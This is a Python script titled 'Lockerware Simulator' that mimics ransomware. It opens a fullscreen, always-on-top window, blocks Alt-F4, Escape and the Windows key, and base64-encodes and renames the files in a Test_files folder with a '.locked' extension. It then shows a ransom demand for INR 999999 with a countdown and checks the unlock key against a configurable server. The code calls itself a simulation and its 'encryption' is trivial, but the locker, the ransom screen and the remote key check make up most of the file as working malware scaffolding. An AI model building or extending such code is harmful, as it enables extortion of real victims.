import tkinter as tk
import time
import threading
import os
import sys
import base64
import requests # Added to communicate with server

# ================= CONFIG =================
UNLOCK_KEY = "UNLOCK123"
LOCK_TIME = 900 # seconds (15 minutes)
SERVER_URL = "http://127.0.0.1:5000" # Change this to your VPS IP for online testing

# Determine base path (bundled exe vs script)
if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

TARGET_DIR = os.path.join(BASE_DIR, "Test_files")
# ==========================================

class LockerwareSimulator:
    def __init__(self, root):
        self.root = root
        self.root.title("Lockerware Simulator")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True) # Ensure it stays on top
        self.root.lift()
        self.root.focus_force()
        self.root.configure(bg="black")

        # Disable close actions
        self.root.protocol("WM_DELETE_WINDOW", self.disable_event)
        self.root.bind("<Alt-F4>", self.disable_event)
        self.root.bind("<Escape>", self.disable_event)
        self.root.bind("<Win_L>", self.disable_event) # Block Windows Key
        self.root.bind("<Win_R>", self.disable_event)

        self.time_left = LOCK_TIME

        self.create_ui()
        self.encrypt_test_files()
        self.start_timer()

    def disable_event(self, event=None):
        pass  # Intentionally block closing

    def create_ui(self):
        title = tk.Label(
            self.root,
            text=("YOUR SYSTEM HAS BEEN LOCKED😝\n\n"
                "TO UNLOCK TRANSFER AMOUNT INR 999999/- ONLY"
            ),
            fg="red",
            bg="black",
            font=("Arial", 28, "bold")
        )
        title.pack(pady=(20, 10))

        msg = tk.Label(
            self.root,
            text=(
                "All your system access has been restricted.\n"
                "To regain access, enter the decryption key.\n"
                "Failure to do so will result in permanent lock."
            ),
            fg="white",
            bg="black",
            font=("Arial", 14),
            justify="center"
        )
        msg.pack(pady=10)

        self.timer_label = tk.Label(
            self.root,
            text="Time Left: --:--",
            fg="yellow",
            bg="black",
            font=("Arial", 20)
        )
        self.timer_label.pack(pady=10)

        key_label = tk.Label(
            self.root,
            text="Enter Decryption Key:",
            fg="white",
            bg="black",
            font=("Arial", 16)
        )
        key_label.pack(pady=10)

        self.key_entry = tk.Entry(
            self.root,
            font=("Arial", 16),
            width=30,
            show="*"
        )
        self.key_entry.pack(pady=5)

        unlock_btn = tk.Button(
            self.root,
            text="UNLOCK SYSTEM",
            font=("Arial", 14, "bold"),
            bg="red",
            fg="white",
            padx=30,
            pady=8,
            command=self.check_key
        )
        unlock_btn.pack(pady=15)

        self.status_label = tk.Label(
            self.root,
            text="",
            fg="red",
            bg="black",
            font=("Arial", 14)
        )
        self.status_label.pack()

    def start_timer(self):
        def countdown():
            while self.time_left > 0:
                mins, secs = divmod(self.time_left, 60)
                self.timer_label.config(
                    text=f"Time Left: {mins:02d}:{secs:02d}"
                )
                time.sleep(1)
                self.time_left -= 1

            self.timer_label.config(text="TIME EXPIRED")
            self.status_label.config(
                text="System permanently locked (Simulation)"
            )

        t = threading.Thread(target=countdown, daemon=True)
        t.start()

    def check_key(self):
        entered_key = self.key_entry.get()
        self.status_label.config(text="Verifying...", fg="white")
        
        try:
            # Verify key via server to ensure files are decrypted
            response = requests.post(
                f"{SERVER_URL}/verify-key",
                json={"key": entered_key},
                timeout=5
            )
            
            if response.status_code == 200:
                self.unlock_system()
            else:
                self.status_label.config(text="Invalid key. Try again.", fg="red")
        except Exception as e:
            # Fallback to local check if server is unreachable
            if entered_key == UNLOCK_KEY:
                self.unlock_system()
            else:
                self.status_label.config(text=f"Connection Error & Invalid Key.", fg="red")

    def unlock_system(self):
        # We don't need to call decrypt_test_files here because 
        # the server's /verify-key already did it.
        self.root.destroy()

    def encrypt_test_files(self):
        """Simulates encryption by Base64 encoding files and renaming them."""
        if not os.path.exists(TARGET_DIR):
            return

        for filename in os.listdir(TARGET_DIR):
            file_path = os.path.join(TARGET_DIR, filename)
            
            # Skip directories and already locked files
            if os.path.isdir(file_path) or filename.endswith(".locked") or filename == "README_RESTORE.txt":
                continue

            try:
                # Read content
                with open(file_path, "rb") as f:
                    content = f.read()

                # Encode content
                encoded_content = base64.b64encode(content)

                # Write encoded content
                with open(file_path, "wb") as f:
                    f.write(encoded_content)

                # Rename file
                os.rename(file_path, file_path + ".locked")
                print(f"Locked: {filename}")
            except Exception as e:
                print(f"Error locking {filename}: {e}")

    def decrypt_test_files(self):
        """Simulates decryption by Base64 decoding files and removing extension."""
        if not os.path.exists(TARGET_DIR):
            return

        for filename in os.listdir(TARGET_DIR):
            if not filename.endswith(".locked"):
                continue

            locked_path = os.path.join(TARGET_DIR, filename)
            original_path = locked_path[:-7] # Remove '.locked'

            try:
                # Read encoded content
                with open(locked_path, "rb") as f:
                    encoded_content = f.read()

                # Decode content
                decoded_content = base64.b64decode(encoded_content)

                # Write decoded content
                with open(locked_path, "wb") as f:
                    f.write(decoded_content)

                # Rename back
                os.rename(locked_path, original_path)
                print(f"Unlocked: {original_path}")
            except Exception as e:
                print(f"Error unlocking {filename}: {e}")


if __name__ == "__main__":
    root = tk.Tk()
    app = LockerwareSimulator(root)
    root.mainloop()